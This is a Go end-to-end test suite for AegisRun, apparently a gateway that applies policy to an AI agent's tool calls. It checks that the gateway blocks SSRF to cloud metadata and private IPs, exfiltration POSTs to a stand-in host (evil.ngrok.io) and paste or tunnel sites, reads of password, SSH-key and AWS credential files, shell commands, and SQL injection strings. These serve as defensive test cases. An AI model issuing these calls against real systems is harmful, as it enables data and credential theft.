// Package e2e provides end-to-end tests for the AegisRun system
package e2e

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"reflect"
	"strings"
	"testing"
	"time"
)

type testAssert struct{}
type testRequire struct{}

func formatAssertionMsg(msgAndArgs ...interface{}) string {
	if len(msgAndArgs) == 0 {
		return ""
	}
	if format, ok := msgAndArgs[0].(string); ok {
		if len(msgAndArgs) > 1 {
			return fmt.Sprintf(format, msgAndArgs[1:]...)
		}
		return format
	}
	return fmt.Sprint(msgAndArgs...)
}

func toFloat64(value interface{}) (float64, bool) {
	switch v := value.(type) {
	case int:
		return float64(v), true
	case int8:
		return float64(v), true
	case int16:
		return float64(v), true
	case int32:
		return float64(v), true
	case int64:
		return float64(v), true
	case uint:
		return float64(v), true
	case uint8:
		return float64(v), true
	case uint16:
		return float64(v), true
	case uint32:
		return float64(v), true
	case uint64:
		return float64(v), true
	case float32:
		return float64(v), true
	case float64:
		return v, true
	default:
		return 0, false
	}
}

func isEmpty(value interface{}) bool {
	if value == nil {
		return true
	}
	rv := reflect.ValueOf(value)
	switch rv.Kind() {
	case reflect.String, reflect.Array, reflect.Slice, reflect.Map:
		return rv.Len() == 0
	case reflect.Bool:
		return !rv.Bool()
	case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:
		return rv.Int() == 0
	case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr:
		return rv.Uint() == 0
	case reflect.Float32, reflect.Float64:
		return rv.Float() == 0
	case reflect.Interface, reflect.Pointer:
		return rv.IsNil()
	default:
		return false
	}
}

func (testAssert) Equal(t *testing.T, expected, actual interface{}, msgAndArgs ...interface{}) bool {
	t.Helper()
	if !reflect.DeepEqual(expected, actual) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("not equal: expected=%v actual=%v", expected, actual)
		} else {
			t.Errorf("%s: expected=%v actual=%v", msg, expected, actual)
		}
		return false
	}
	return true
}

func (testAssert) NotEqual(t *testing.T, expected, actual interface{}, msgAndArgs ...interface{}) bool {
	t.Helper()
	if reflect.DeepEqual(expected, actual) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("unexpected equality: value=%v", actual)
		} else {
			t.Errorf("%s: unexpected equality: value=%v", msg, actual)
		}
		return false
	}
	return true
}

func (testAssert) NotEmpty(t *testing.T, object interface{}, msgAndArgs ...interface{}) bool {
	t.Helper()
	if isEmpty(object) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("value should not be empty")
		} else {
			t.Errorf("%s", msg)
		}
		return false
	}
	return true
}

func (testAssert) Greater(t *testing.T, actual, expected interface{}, msgAndArgs ...interface{}) bool {
	t.Helper()
	a, okA := toFloat64(actual)
	e, okE := toFloat64(expected)
	if !okA || !okE || !(a > e) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("expected %v to be greater than %v", actual, expected)
		} else {
			t.Errorf("%s", msg)
		}
		return false
	}
	return true
}

func (testAssert) GreaterOrEqual(t *testing.T, actual, expected interface{}, msgAndArgs ...interface{}) bool {
	t.Helper()
	a, okA := toFloat64(actual)
	e, okE := toFloat64(expected)
	if !okA || !okE || !(a >= e) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("expected %v to be greater than or equal to %v", actual, expected)
		} else {
			t.Errorf("%s", msg)
		}
		return false
	}
	return true
}

func (testAssert) NotContains(t *testing.T, s interface{}, contains interface{}, msgAndArgs ...interface{}) bool {
	t.Helper()
	haystack := fmt.Sprint(s)
	needle := fmt.Sprint(contains)
	if strings.Contains(haystack, needle) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("expected %q not to contain %q", haystack, needle)
		} else {
			t.Errorf("%s", msg)
		}
		return false
	}
	return true
}

func (testAssert) Less(t *testing.T, actual, expected interface{}, msgAndArgs ...interface{}) bool {
	t.Helper()
	a, okA := toFloat64(actual)
	e, okE := toFloat64(expected)
	if !okA || !okE || !(a < e) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("expected %v to be less than %v", actual, expected)
		} else {
			t.Errorf("%s", msg)
		}
		return false
	}
	return true
}

func (testAssert) False(t *testing.T, value bool, msgAndArgs ...interface{}) bool {
	t.Helper()
	if value {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("expected false")
		} else {
			t.Errorf("%s", msg)
		}
		return false
	}
	return true
}

func (testAssert) Len(t *testing.T, object interface{}, length int, msgAndArgs ...interface{}) bool {
	t.Helper()
	if object == nil {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("expected length %d, got nil", length)
		} else {
			t.Errorf("%s", msg)
		}
		return false
	}
	rv := reflect.ValueOf(object)
	switch rv.Kind() {
	case reflect.Array, reflect.Slice, reflect.Map, reflect.String:
		if rv.Len() != length {
			msg := formatAssertionMsg(msgAndArgs...)
			if msg == "" {
				t.Errorf("expected length %d, got %d", length, rv.Len())
			} else {
				t.Errorf("%s", msg)
			}
			return false
		}
	default:
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("value has no length")
		} else {
			t.Errorf("%s", msg)
		}
		return false
	}
	return true
}

func (testAssert) Nil(t *testing.T, object interface{}, msgAndArgs ...interface{}) bool {
	t.Helper()
	isNil := false
	if object == nil {
		isNil = true
	} else {
		rv := reflect.ValueOf(object)
		switch rv.Kind() {
		case reflect.Chan, reflect.Func, reflect.Interface, reflect.Map, reflect.Pointer, reflect.Slice:
			isNil = rv.IsNil()
		}
	}
	if !isNil {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Errorf("expected nil, got %v", object)
		} else {
			t.Errorf("%s", msg)
		}
		return false
	}
	return true
}

func (testRequire) NoError(t *testing.T, err error, msgAndArgs ...interface{}) {
	t.Helper()
	if err != nil {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Fatalf("unexpected error: %v", err)
		} else {
			t.Fatalf("%s: %v", msg, err)
		}
	}
}

func (testRequire) NotEmpty(t *testing.T, object interface{}, msgAndArgs ...interface{}) {
	t.Helper()
	if isEmpty(object) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Fatalf("value should not be empty")
		} else {
			t.Fatalf("%s", msg)
		}
	}
}

func (testRequire) Equal(t *testing.T, expected, actual interface{}, msgAndArgs ...interface{}) {
	t.Helper()
	if !reflect.DeepEqual(expected, actual) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Fatalf("not equal: expected=%v actual=%v", expected, actual)
		} else {
			t.Fatalf("%s: expected=%v actual=%v", msg, expected, actual)
		}
	}
}

func (testRequire) NotNil(t *testing.T, object interface{}, msgAndArgs ...interface{}) {
	t.Helper()
	isNil := false
	if object == nil {
		isNil = true
	} else {
		rv := reflect.ValueOf(object)
		switch rv.Kind() {
		case reflect.Chan, reflect.Func, reflect.Interface, reflect.Map, reflect.Pointer, reflect.Slice:
			isNil = rv.IsNil()
		}
	}
	if isNil {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Fatalf("expected non-nil value")
		} else {
			t.Fatalf("%s", msg)
		}
	}
}

func (testRequire) Greater(t *testing.T, actual, expected interface{}, msgAndArgs ...interface{}) {
	t.Helper()
	a, okA := toFloat64(actual)
	e, okE := toFloat64(expected)
	if !okA || !okE || !(a > e) {
		msg := formatAssertionMsg(msgAndArgs...)
		if msg == "" {
			t.Fatalf("expected %v to be greater than %v", actual, expected)
		} else {
			t.Fatalf("%s", msg)
		}
	}
}

// TestConfig holds E2E test configuration
type TestConfig struct {
	APIURL     string
	APIToken   string
	PolicyID   string
	PolicyVer  string
	HTTPClient *http.Client
}

// LoadTestConfig loads configuration from environment
func LoadTestConfig() *TestConfig {
	return &TestConfig{
		APIURL:    getEnv("AEGISRUN_API_URL", "http://localhost:8080"),
		APIToken:  getEnv("AEGISRUN_API_TOKEN", "test-token"),
		PolicyID:  getEnv("AEGISRUN_POLICY_ID", "production-standard"),
		PolicyVer: getEnv("AEGISRUN_POLICY_VERSION", "v1"),
		HTTPClient: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

func getEnv(key, defaultVal string) string {
	if val := os.Getenv(key); val != "" {
		return val
	}
	return defaultVal
}

// APIClient wraps HTTP calls to AegisRun API
type APIClient struct {
	config *TestConfig
}

// NewAPIClient creates a new API client
func NewAPIClient(config *TestConfig) *APIClient {
	return &APIClient{config: config}
}

// CreateRun creates a new run
func (c *APIClient) CreateRun(ctx context.Context, metadata map[string]interface{}) (map[string]interface{}, error) {
	payload := map[string]interface{}{
		"policy_id":      c.config.PolicyID,
		"policy_version": c.config.PolicyVer,
		"metadata":       metadata,
	}
	return c.post(ctx, "/api/v1/runs", payload)
}

// GetRun fetches run details
func (c *APIClient) GetRun(ctx context.Context, runID string) (map[string]interface{}, error) {
	return c.get(ctx, fmt.Sprintf("/api/v1/runs/%s", runID))
}

// ExecuteToolCall executes a tool call through the gateway
func (c *APIClient) ExecuteToolCall(ctx context.Context, req ToolCallRequest) (map[string]interface{}, error) {
	return c.post(ctx, "/api/v1/gateway/tool-call", req)
}

// GetTimeline fetches the run timeline
func (c *APIClient) GetTimeline(ctx context.Context, runID string) (map[string]interface{}, error) {
	return c.get(ctx, fmt.Sprintf("/api/v1/runs/%s/timeline", runID))
}

// ExportEvidence exports the evidence bundle
func (c *APIClient) ExportEvidence(ctx context.Context, runID string) ([]byte, error) {
	url := fmt.Sprintf("%s/api/v1/evidence/%s/bundle", c.config.APIURL, runID)

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", "Bearer "+c.config.APIToken)

	resp, err := c.config.HTTPClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("export failed: %d - %s", resp.StatusCode, string(body))
	}

	return io.ReadAll(resp.Body)
}

// HealthCheck verifies API is available
func (c *APIClient) HealthCheck(ctx context.Context) error {
	_, err := c.get(ctx, "/api/v1/health")
	return err
}

func (c *APIClient) get(ctx context.Context, path string) (map[string]interface{}, error) {
	url := c.config.APIURL + path

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", "Bearer "+c.config.APIToken)
	req.Header.Set("Accept", "application/json")

	resp, err := c.config.HTTPClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}

	return result, nil
}

func (c *APIClient) post(ctx context.Context, path string, payload interface{}) (map[string]interface{}, error) {
	url := c.config.APIURL + path

	jsonBody, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewReader(jsonBody))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", "Bearer "+c.config.APIToken)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	resp, err := c.config.HTTPClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}

	return result, nil
}

// ToolCallRequest represents a tool call request
type ToolCallRequest struct {
	RunID       string                 `json:"run_id"`
	StepID      string                 `json:"step_id"`
	ToolName    string                 `json:"tool_name"`
	Args        map[string]interface{} `json:"args"`
	StateVector map[string]interface{} `json:"state_vector"`
	Executor    string                 `json:"executor"`
}

// TestFullSystemFlow tests the complete system flow from run creation to evidence export
func TestFullSystemFlow(t *testing.T) {
	assert := testAssert{}
	require := testRequire{}

	if testing.Short() {
		t.Skip("Skipping E2E test in short mode")
	}

	config := LoadTestConfig()
	client := NewAPIClient(config)
	ctx := context.Background()

	// Step 1: Health check
	t.Run("HealthCheck", func(t *testing.T) {
		err := client.HealthCheck(ctx)
		require.NoError(t, err, "API should be healthy")
	})

	var runID string

	// Step 2: Create run
	t.Run("CreateRun", func(t *testing.T) {
		metadata := map[string]interface{}{
			"test":        "full_flow",
			"environment": "e2e",
			"timestamp":   time.Now().Format(time.RFC3339),
		}

		result, err := client.CreateRun(ctx, metadata)
		require.NoError(t, err, "Should create run")

		runID = result["run_id"].(string)
		assert.NotEmpty(t, runID, "Run ID should be returned")
		assert.Equal(t, "running", result["status"], "Status should be running")

		t.Logf("Created run: %s", runID)
	})

	require.NotEmpty(t, runID, "Need run ID to continue")

	// Step 3: Execute allowed tool call
	t.Run("ExecuteAllowedToolCall", func(t *testing.T) {
		req := ToolCallRequest{
			RunID:    runID,
			StepID:   "step_allowed_001",
			ToolName: "http_request",
			Args: map[string]interface{}{
				"url":    "https://api.github.com/zen",
				"method": "GET",
			},
			StateVector: map[string]interface{}{"step": 1},
			Executor:    "builtin",
		}

		result, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err, "Should execute tool call")

		decision := result["decision"].(map[string]interface{})
		action := decision["action"].(string)

		assert.Equal(t, "allow", action, "Should be allowed")
		t.Logf("Tool call allowed: %v", decision)
	})

	// Step 4: Execute blocked tool call (SSRF)
	t.Run("ExecuteBlockedToolCall_SSRF", func(t *testing.T) {
		req := ToolCallRequest{
			RunID:    runID,
			StepID:   "step_blocked_001",
			ToolName: "http_request",
			Args: map[string]interface{}{
				"url":    "http://169.254.169.254/latest/meta-data/",
				"method": "GET",
			},
			StateVector: map[string]interface{}{"step": 2},
			Executor:    "builtin",
		}

		result, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err, "Should return result even if blocked")

		decision := result["decision"].(map[string]interface{})
		action := decision["action"].(string)

		assert.Equal(t, "block", action, "SSRF should be blocked")
		assert.NotEmpty(t, decision["policy_rule_id"], "Should reference policy rule")
		t.Logf("Tool call blocked: %v", decision)
	})

	// Step 5: Execute blocked tool call (exfiltration)
	t.Run("ExecuteBlockedToolCall_Exfil", func(t *testing.T) {
		req := ToolCallRequest{
			RunID:    runID,
			StepID:   "step_blocked_002",
			ToolName: "http_request",
			Args: map[string]interface{}{
				"url":    "https://evil.ngrok.io/exfil",
				"method": "POST",
				"body":   "stolen_data",
			},
			StateVector: map[string]interface{}{"step": 3},
			Executor:    "builtin",
		}

		result, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err, "Should return result even if blocked")

		decision := result["decision"].(map[string]interface{})
		action := decision["action"].(string)

		assert.Equal(t, "block", action, "Exfiltration should be blocked")
		t.Logf("Exfil blocked: %v", decision)
	})

	// Step 6: Execute file write to allowed path
	t.Run("ExecuteAllowedFileWrite", func(t *testing.T) {
		req := ToolCallRequest{
			RunID:    runID,
			StepID:   "step_allowed_002",
			ToolName: "file_write",
			Args: map[string]interface{}{
				"path":    "/tmp/e2e_test_output.json",
				"content": `{"test": "success"}`,
			},
			StateVector: map[string]interface{}{"step": 4},
			Executor:    "builtin",
		}

		result, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err, "Should execute tool call")

		decision := result["decision"].(map[string]interface{})
		action := decision["action"].(string)

		assert.Equal(t, "allow", action, "/tmp write should be allowed")
	})

	// Step 7: Execute blocked file read
	t.Run("ExecuteBlockedFileRead", func(t *testing.T) {
		req := ToolCallRequest{
			RunID:    runID,
			StepID:   "step_blocked_003",
			ToolName: "file_read",
			Args: map[string]interface{}{
				"path": "/etc/shadow",
			},
			StateVector: map[string]interface{}{"step": 5},
			Executor:    "builtin",
		}

		result, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err, "Should return result")

		decision := result["decision"].(map[string]interface{})
		action := decision["action"].(string)

		assert.Equal(t, "block", action, "Sensitive file read should be blocked")
	})

	// Step 8: Execute blocked shell command
	t.Run("ExecuteBlockedShellExec", func(t *testing.T) {
		req := ToolCallRequest{
			RunID:    runID,
			StepID:   "step_blocked_004",
			ToolName: "shell_exec",
			Args: map[string]interface{}{
				"command": "cat /etc/passwd",
			},
			StateVector: map[string]interface{}{"step": 6},
			Executor:    "builtin",
		}

		result, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err, "Should return result")

		decision := result["decision"].(map[string]interface{})
		action := decision["action"].(string)

		assert.Equal(t, "block", action, "Shell exec should be blocked in production")
	})

	// Step 9: Verify timeline
	t.Run("VerifyTimeline", func(t *testing.T) {
		timeline, err := client.GetTimeline(ctx, runID)
		require.NoError(t, err, "Should fetch timeline")

		toolCalls := timeline["tool_calls"].([]interface{})
		assert.GreaterOrEqual(t, len(toolCalls), 6, "Should have at least 6 tool calls")

		// Count blocks
		blockedCount := 0
		for _, tc := range toolCalls {
			tcMap := tc.(map[string]interface{})
			decision := tcMap["decision"].(map[string]interface{})
			if decision["action"] == "block" {
				blockedCount++
			}
		}

		assert.GreaterOrEqual(t, blockedCount, 4, "Should have at least 4 blocked calls")
		t.Logf("Timeline: %d tool calls, %d blocked", len(toolCalls), blockedCount)
	})

	// Step 10: Export evidence bundle
	t.Run("ExportEvidenceBundle", func(t *testing.T) {
		bundle, err := client.ExportEvidence(ctx, runID)
		require.NoError(t, err, "Should export evidence")

		assert.Greater(t, len(bundle), 0, "Bundle should not be empty")
		t.Logf("Evidence bundle size: %d bytes", len(bundle))

		// Verify it's a valid ZIP
		assert.Equal(t, []byte("PK"), bundle[:2], "Should be a ZIP file")
	})

	// Step 11: Verify run status and counters
	t.Run("VerifyRunStatus", func(t *testing.T) {
		run, err := client.GetRun(ctx, runID)
		require.NoError(t, err, "Should fetch run")

		counters := run["counters"].(map[string]interface{})
		blocks := int(counters["blocks"].(float64))

		assert.GreaterOrEqual(t, blocks, 4, "Should have recorded blocked calls")
		t.Logf("Run counters: %v", counters)
	})
}

// TestPolicyEnforcement tests specific policy enforcement scenarios
func TestPolicyEnforcement(t *testing.T) {
	assert := testAssert{}
	require := testRequire{}

	if testing.Short() {
		t.Skip("Skipping E2E test in short mode")
	}

	config := LoadTestConfig()
	client := NewAPIClient(config)
	ctx := context.Background()

	// Create run for policy tests
	run, err := client.CreateRun(ctx, map[string]interface{}{
		"test": "policy_enforcement",
	})
	require.NoError(t, err)
	runID := run["run_id"].(string)

	t.Run("BlockPrivateIPAccess", func(t *testing.T) {
		privateIPs := []string{
			"http://10.0.0.1/admin",
			"http://172.16.0.1/",
			"http://192.168.1.1/",
			"http://127.0.0.1/",
			"http://localhost/",
		}

		for _, ip := range privateIPs {
			req := ToolCallRequest{
				RunID:       runID,
				StepID:      fmt.Sprintf("step_private_%d", time.Now().UnixNano()),
				ToolName:    "http_request",
				Args:        map[string]interface{}{"url": ip, "method": "GET"},
				StateVector: map[string]interface{}{},
				Executor:    "builtin",
			}

			result, err := client.ExecuteToolCall(ctx, req)
			require.NoError(t, err)

			decision := result["decision"].(map[string]interface{})
			assert.Equal(t, "block", decision["action"], fmt.Sprintf("Private IP %s should be blocked", ip))
		}
	})

	t.Run("BlockCloudMetadataEndpoints", func(t *testing.T) {
		endpoints := []string{
			"http://169.254.169.254/latest/meta-data/",
			"http://169.254.169.254/latest/user-data/",
			"http://metadata.google.internal/",
		}

		for _, endpoint := range endpoints {
			req := ToolCallRequest{
				RunID:       runID,
				StepID:      fmt.Sprintf("step_metadata_%d", time.Now().UnixNano()),
				ToolName:    "http_request",
				Args:        map[string]interface{}{"url": endpoint, "method": "GET"},
				StateVector: map[string]interface{}{},
				Executor:    "builtin",
			}

			result, err := client.ExecuteToolCall(ctx, req)
			require.NoError(t, err)

			decision := result["decision"].(map[string]interface{})
			assert.Equal(t, "block", decision["action"], fmt.Sprintf("Metadata endpoint %s should be blocked", endpoint))
		}
	})

	t.Run("BlockExfiltrationDomains", func(t *testing.T) {
		domains := []string{
			"https://pastebin.com/api/",
			"https://evil.ngrok.io/",
			"https://tunnel.serveo.net/",
			"https://transfer.sh/",
		}

		for _, domain := range domains {
			req := ToolCallRequest{
				RunID:       runID,
				StepID:      fmt.Sprintf("step_exfil_%d", time.Now().UnixNano()),
				ToolName:    "http_request",
				Args:        map[string]interface{}{"url": domain, "method": "POST", "body": "data"},
				StateVector: map[string]interface{}{},
				Executor:    "builtin",
			}

			result, err := client.ExecuteToolCall(ctx, req)
			require.NoError(t, err)

			decision := result["decision"].(map[string]interface{})
			assert.Equal(t, "block", decision["action"], fmt.Sprintf("Exfil domain %s should be blocked", domain))
		}
	})

	t.Run("BlockPathTraversal", func(t *testing.T) {
		paths := []string{
			"../../etc/passwd",
			"/etc/shadow",
			"~/.ssh/id_rsa",
			"/root/.aws/credentials",
		}

		for _, path := range paths {
			req := ToolCallRequest{
				RunID:       runID,
				StepID:      fmt.Sprintf("step_path_%d", time.Now().UnixNano()),
				ToolName:    "file_read",
				Args:        map[string]interface{}{"path": path},
				StateVector: map[string]interface{}{},
				Executor:    "builtin",
			}

			result, err := client.ExecuteToolCall(ctx, req)
			require.NoError(t, err)

			decision := result["decision"].(map[string]interface{})
			assert.Equal(t, "block", decision["action"], fmt.Sprintf("Path %s should be blocked", path))
		}
	})

	t.Run("BlockSQLInjection", func(t *testing.T) {
		queries := []string{
			"SELECT * FROM users; DROP TABLE users;--",
			"SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin",
			"GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'",
		}

		for _, query := range queries {
			req := ToolCallRequest{
				RunID:       runID,
				StepID:      fmt.Sprintf("step_sql_%d", time.Now().UnixNano()),
				ToolName:    "database_query",
				Args:        map[string]interface{}{"query": query, "params": []interface{}{}},
				StateVector: map[string]interface{}{},
				Executor:    "builtin",
			}

			result, err := client.ExecuteToolCall(ctx, req)
			require.NoError(t, err)

			decision := result["decision"].(map[string]interface{})
			assert.Equal(t, "block", decision["action"], fmt.Sprintf("SQL injection should be blocked: %s", query[:30]))
		}
	})
}

// TestBudgetEnforcement tests budget limit enforcement
func TestBudgetEnforcement(t *testing.T) {
	assert := testAssert{}
	require := testRequire{}

	if testing.Short() {
		t.Skip("Skipping E2E test in short mode")
	}

	config := LoadTestConfig()
	client := NewAPIClient(config)
	ctx := context.Background()

	// Create a policy with very low budget limits so the test triggers enforcement
	// without requiring an external policy fixture.
	lowBudgetPolicy := map[string]interface{}{
		"name":    fmt.Sprintf("budget-test-%d", time.Now().UnixNano()),
		"version": "v1",
		"spec": map[string]interface{}{
			"tools": []interface{}{
				map[string]interface{}{
					"name":   "*",
					"action": "allow",
				},
			},
			"budgets": map[string]interface{}{
				"max_tool_calls": 2,
				"max_retries":    1,
			},
		},
	}

	policyResp, err := client.post(ctx, "/api/v1/policies", lowBudgetPolicy)
	require.NoError(t, err, "failed to create low-budget policy")
	policyID := policyResp["policy_id"].(string)
	t.Logf("Created low-budget policy %s", policyID)

	// Create a run bound to the low-budget policy
	runPayload := map[string]interface{}{
		"policy_id":      policyID,
		"policy_version": "v1",
		"metadata":       map[string]interface{}{"test": "budget_enforcement"},
	}
	run, err := client.post(ctx, "/api/v1/runs", runPayload)
	require.NoError(t, err, "failed to create run")
	runID := run["run_id"].(string)
	t.Logf("Created run %s", runID)

	t.Run("WithinBudget", func(t *testing.T) {
		// First tool call – should succeed (1/2)
		req := ToolCallRequest{
			RunID:       runID,
			StepID:      "step_budget_1",
			ToolName:    "http_request",
			Args:        map[string]interface{}{"url": "https://example.com"},
			StateVector: map[string]interface{}{},
			Executor:    "builtin",
		}
		result, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err)

		decision := result["decision"].(map[string]interface{})
		assert.NotEqual(t, "block", decision["action"],
			"First tool call should not be blocked (within budget)")
		t.Log("Tool call 1/2: allowed")
	})

	t.Run("StillWithinBudget", func(t *testing.T) {
		// Second tool call – should succeed (2/2)
		req := ToolCallRequest{
			RunID:       runID,
			StepID:      "step_budget_2",
			ToolName:    "read_file",
			Args:        map[string]interface{}{"path": "/tmp/test.txt"},
			StateVector: map[string]interface{}{},
			Executor:    "builtin",
		}
		result, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err)

		decision := result["decision"].(map[string]interface{})
		assert.NotEqual(t, "block", decision["action"],
			"Second tool call should not be blocked (exactly at budget)")
		t.Log("Tool call 2/2: allowed")
	})

	t.Run("ExceedsBudget", func(t *testing.T) {
		// Third tool call – should be blocked (exceeds max_tool_calls=2)
		req := ToolCallRequest{
			RunID:       runID,
			StepID:      "step_budget_3",
			ToolName:    "http_request",
			Args:        map[string]interface{}{"url": "https://over-budget.example.com"},
			StateVector: map[string]interface{}{},
			Executor:    "builtin",
		}
		result, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err)

		decision := result["decision"].(map[string]interface{})
		assert.Equal(t, "block", decision["action"],
			"Third tool call should be blocked (budget exceeded)")
		t.Log("Tool call 3 blocked as expected – budget enforcement works")
	})

	t.Run("RunCountersReflectUsage", func(t *testing.T) {
		runData, err := client.GetRun(ctx, runID)
		require.NoError(t, err)

		if counters, ok := runData["counters"].(map[string]interface{}); ok {
			tc, _ := counters["tool_calls"].(float64)
			assert.GreaterOrEqual(t, int(tc), 2,
				"Run counters should reflect at least 2 tool calls")
		}
	})
}

// TestRedaction tests data redaction
func TestRedaction(t *testing.T) {
	assert := testAssert{}
	require := testRequire{}

	if testing.Short() {
		t.Skip("Skipping E2E test in short mode")
	}

	config := LoadTestConfig()
	client := NewAPIClient(config)
	ctx := context.Background()

	run, err := client.CreateRun(ctx, map[string]interface{}{"test": "redaction"})
	require.NoError(t, err)
	runID := run["run_id"].(string)

	t.Run("RedactSensitiveData", func(t *testing.T) {
		// Execute tool call with sensitive data
		req := ToolCallRequest{
			RunID:    runID,
			StepID:   "step_redact_001",
			ToolName: "http_request",
			Args: map[string]interface{}{
				"url":    "https://api.example.com/data",
				"method": "POST",
				"body":   `{"password": "super-secret-123", "api_key": "sk_live_abc123"}`, // gitleaks:allow
			},
			StateVector: map[string]interface{}{},
			Executor:    "builtin",
		}

		_, err := client.ExecuteToolCall(ctx, req)
		require.NoError(t, err)

		// Fetch timeline and verify redaction
		timeline, err := client.GetTimeline(ctx, runID)
		require.NoError(t, err)

		toolCalls := timeline["tool_calls"].([]interface{})
		require.Greater(t, len(toolCalls), 0)

		lastCall := toolCalls[len(toolCalls)-1].(map[string]interface{})
		argsRedacted := lastCall["args_redacted"].(bool)

		// If policy has redaction enabled, args should be redacted
		if argsRedacted {
			args := lastCall["args"].(map[string]interface{})
			body := args["body"].(string)
			assert.NotContains(t, body, "super-secret-123", "Password should be redacted")
			assert.NotContains(t, body, "sk_live_abc123", "API key should be redacted")
			t.Log("Sensitive data was properly redacted")
		} else {
			t.Log("Redaction not enabled for this policy")
		}
	})
}
